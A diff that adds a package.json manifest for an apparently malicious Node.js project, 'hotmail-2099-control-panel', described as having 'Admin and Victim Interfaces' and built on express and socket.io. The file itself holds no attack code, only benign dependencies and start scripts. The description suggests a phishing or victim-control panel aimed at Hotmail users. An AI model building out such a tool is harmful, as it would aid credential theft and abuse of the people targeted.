@@ -1,1 +1,26 @@
-
+{
+  "name": "hotmail-2099-control-panel",
+  "version": "2.1.0",
+  "description": "Advanced Hotmail Control Panel with Admin and Victim Interfaces",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "socket.io": "^4.7.2",
+    "cors": "^2.8.5",
+    "dotenv": "^16.3.1"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/YourUsername/hotmail-2099.git"
+  },
+  "keywords": ["hotmail", "control-panel", "socket.io", "webrtc"],
+  "author": "The Architect",
+  "license": "MIT"
+}
